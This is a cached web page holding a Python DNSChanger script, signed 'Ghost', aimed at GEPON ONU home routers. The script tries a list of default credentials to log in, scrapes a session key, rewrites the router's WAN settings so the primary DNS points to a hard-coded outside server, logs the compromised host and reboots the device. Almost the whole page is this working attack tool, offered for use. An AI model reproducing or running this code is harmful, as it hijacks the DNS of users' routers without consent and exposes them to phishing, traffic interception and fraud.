
<!-- saved from url=(0154)http://webcache.googleusercontent.com/search?q=cache:_KtijdlgUTEJ:goldenkash.com/application/class/routers_py/router.GEPONONU.py+&cd=4&hl=en&ct=clnk&gl=us -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!--<base href="http://goldenkash.com/application/class/routers_py/router.GEPONONU.py">--><base href="."><style>body{margin-left:0;margin-right:0;margin-top:0}#bN015htcoyT__google-cache-hdr{background:#f5f5f5;font:13px arial,sans-serif;text-align:left;color:#202020;border:0;margin:0;border-bottom:1px solid #cecece;line-height:16px;padding:16px 28px 24px 28px}#bN015htcoyT__google-cache-hdr *{display:inline;font:inherit;text-align:inherit;color:inherit;line-height:inherit;background:none;border:0;margin:0;padding:0;letter-spacing:0}#bN015htcoyT__google-cache-hdr a{text-decoration:none;color:#1a0dab}#bN015htcoyT__google-cache-hdr a:hover{text-decoration:underline}#bN015htcoyT__google-cache-hdr a:visited{color:#609}#bN015htcoyT__google-cache-hdr div{display:block;margin-top:4px}#bN015htcoyT__google-cache-hdr b{font-weight:bold;display:inline-block;direction:ltr}</style><style>pre{white-space:pre-wrap}</style></head><body><div id="bN015htcoyT__google-cache-hdr"><div><span>This is Google's cache of <a href="http://goldenkash.com/application/class/routers_py/router.GEPONONU.py">http://goldenkash.com/application/class/routers_py/router.GEPONONU.py</a>.</span>&nbsp;<span>It is a snapshot of the page as it appeared on Sep 16, 2018 13:42:57 GMT.</span>&nbsp;<span>The <a href="http://goldenkash.com/application/class/routers_py/router.GEPONONU.py">current page</a> could have changed in the meantime.</span>&nbsp;<a href="http://support.google.com/websearch/bin/answer.py?hl=en&amp;p=cached&amp;answer=1687222"><span>Learn more</span>.</a></div><span style="display:inline-block;margin-top:8px;color:#717171"><span>Tip: To quickly find your search term on this page, press <b>Ctrl+F</b> or <b>⌘-F</b> (Mac) and use the find bar.</span></span></div><div style="position:relative; margin:8px;"><pre>#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse, requests, md5, base64, os

from scan import password
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description='Script for DNSChanger by Ghost', prog='Ghost', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=100,width=200))
parser.add_argument("-dns1", "--dns1", help = "Define o dns primário", metavar='', default='192.99.187.193', required=False)
parser.add_argument("-dns2", "--dns2", help = "Define o dns secundário", metavar='', default='8.8.4.4', required=False)
parser.add_argument("-host", "--host", help = "Define o ip e porta do router a ser executado", metavar='', default='a', required=False)

args = parser.parse_args()

dns1 = args.dns1
dns2 = args.dns2
host = args.host.replace("http://","")

router = requests.Session()

for x in password.Credentials:

    xx = x.split(":")

    try:
        login = router.get("http://"+x+"@"+host+"/login.html?usrname="+xx[0]+"&amp;pswd="+xx[1])

        if "main.htm" in login.content:
            break;
    except Exception as e:
        pass

    try:
        getSessionKey = router.get("http://"+x+"@"+host+"/main.htm")

        if "sessionKey" in getSessionKey.content:
            sessionKey = getSessionKey.content.split("sessionKey=")
            sessionKey = sessionKey[1].split('"')
            sessionKey = sessionKey[0]
            print("Key localizada: "+sessionKey)
            break
        else:
            sessionKey = ""


    except Exception as e:
        pass

print(x)

try:
    changeDNS = router.get("http://"+host+"/ctwanconfig.cgi?action=2&amp;act_oid=180&amp;act_inst0=1&amp;act_inst1=1&amp;act_inst2=1&amp;wanIfName=epon0.1&amp;maxMtu=1500&amp;servModeMask=2&amp;lanInterfaceMask=0&amp;enblNat=1&amp;enblFullcone=0&amp;enblFirewall=1&amp;enVlanMux=0&amp;vlanMuxId=NaN&amp;vlanMuxPr=0&amp;enblDhcpClnt=0&amp;wanIpAddress=10.2.3.152&amp;wanSubnetMask=255.255.255.128&amp;wanIntfGateway=10.2.3.129&amp;dnsPrimary="+dns1+"&amp;dnsSecondary="+dns2+"&amp;enblEnetWan=0&amp;upStreamMode=2&amp;ntwkPrtcl=6&amp;oldNtwkPrtcl=6&amp;enblIpVer=0&amp;dns6Type=DHCP&amp;dhcp6cForPd=0&amp;wanV6PrefixOrigin=Static&amp;wanV6PrefixEnbl=0&amp;wanV6AddresOrigin=Static&amp;enblDslite=0&amp;enblIgmp=0&amp;enblMld=0&amp;sessionKey=1730792943")
    os.system("cd /var/www/html/logs;php gravar.php "+host)
except Exception as e:
    pass


try:
    router.get("http://"+host+"/rebootinfo.cgi")
except Exception as e:
    pass</pre></div></body></html>